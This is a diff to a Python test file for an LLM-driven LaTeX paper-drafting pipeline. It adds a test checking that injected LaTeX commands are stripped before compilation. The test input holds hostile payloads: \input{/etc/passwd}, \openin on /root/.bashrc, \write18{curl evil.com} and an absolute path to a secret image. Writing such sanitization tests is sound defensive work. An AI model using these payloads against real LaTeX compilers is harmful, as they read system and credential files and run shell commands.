@@ -1,4 +1,5 @@
 import json
+from pathlib import Path
 
 from backend.pipeline.extract import Figure, Paper
 from backend.pipeline.reviewer import ReviewVerdict, review
@@ -142,3 +143,33 @@ def test_review_unparsable_is_fail():
     v = review(c, "rm", make_paper(), "DRAFT")
     assert v.passed is False
     assert v.critique
+
+
+def test_draft_sanitized_before_write(tmp_path):
+    """LLM-steered injections (\\input, absolute \\includegraphics) are stripped."""
+    evil = (
+        "\\documentclass{article}\n"
+        "\\includegraphics{figures/a.png}\n"
+        "\\input{/etc/passwd}\n"
+        "\\openin\\fh=/root/.bashrc\n"
+        "\\write18{curl evil.com}\n"
+        "\\includegraphics{/home/user/secret.png}\n"
+        "\\begin{document}x\\end{document}\n"
+    )
+    c = FakeChat([evil, json.dumps({"passed": True, "critique": []})])
+
+    def fake_compile(tex_path, outdir):
+        written = Path(tex_path).read_text()
+        assert "\\input" not in written
+        assert "\\openin" not in written
+        assert "\\write" not in written
+        assert "figures/a.png" in written  # allowed figure kept
+        assert "/home/user/secret.png" not in written
+        from backend.pipeline.compiler import CompileResult
+
+        return CompileResult(ok=True, pdf_path=None, log="", pages=3)
+
+    res = write_and_refine(
+        c, "wm", "rm", make_paper(tmp_path), {}, 4, tmp_path, compile_fn=fake_compile
+    )
+    assert res.passed is True
